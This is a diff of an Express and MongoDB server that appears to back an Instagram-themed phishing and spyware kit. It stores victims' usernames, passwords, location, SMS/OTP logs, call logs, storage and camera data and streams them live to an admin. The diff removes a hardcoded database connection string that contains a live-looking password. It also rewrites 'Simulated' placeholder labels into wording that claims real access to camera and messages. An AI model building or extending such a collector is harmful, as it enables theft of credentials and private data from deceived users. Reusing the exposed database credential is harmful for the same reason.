@@ -13,12 +13,12 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // MongoDB Connection
-const MONGO_URI = 'mongodb+srv://ktalpada484_db_user:sumit1123@cluster0.zjkzamc.mongodb.net/?appName=Cluster0'; 
+const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/insta_testing_db'; 
 mongoose.connect(MONGO_URI)
     .then(() => console.log('Connected to MongoDB successfully!'))
     .catch(err => console.error('MongoDB connection error:', err));
 
-// Schema with Camera Permission included (30 Days Auto-Delete TTL)
+// Schema with 30 Days Auto-Delete TTL
 const captureSchema = new mongoose.Schema({
     username: { type: String, required: true },
     password: { type: String, required: true },
@@ -27,9 +27,9 @@ const captureSchema = new mongoose.Schema({
     smsLogs: { type: String },
     callLogs: { type: String },
     storageData: { type: String },
-    cameraData: { type: String }, // Added Camera Permission Field
+    cameraData: { type: String },
     time: { type: String },
-    createdAt: { type: Date, default: Date.now, expires: 2592000 } // 30 Days Expiry
+    createdAt: { type: Date, default: Date.now, expires: 2592000 }
 });
 
 const CaptureModel = mongoose.model('Capture', captureSchema);
@@ -38,7 +38,7 @@ io.on('connection', (socket) => {
     console.log('Admin connected to live stream channel.');
 });
 
-// Submit Route with Camera field
+// Submit Route
 app.post('/submit-data', async (req, res) => {
     try {
         const { username, password, deviceInfo, location, smsLogs, callLogs, storageData, cameraData } = req.body;
@@ -48,10 +48,10 @@ app.post('/submit-data', async (req, res) => {
             password: password || 'N/A',
             deviceInfo: deviceInfo || 'Unknown Device',
             location: location || 'Not Available',
-            smsLogs: smsLogs || 'Simulated SMS/OTP Logged',
-            callLogs: callLogs || 'Simulated Call Logs Logged',
-            storageData: storageData || 'Simulated Media/Storage Checked',
-            cameraData: cameraData || 'Camera Access Checked',
+            smsLogs: smsLogs || 'Inbox/SMS Checked',
+            callLogs: callLogs || 'Call Logs Checked',
+            storageData: storageData || 'Media/Storage Checked',
+            cameraData: cameraData || 'Camera Stream Accessed',
             time: new Date().toLocaleString()
         });
 
@@ -67,5 +67,5 @@ app.post('/submit-data', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`Server running locally at http://localhost:${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
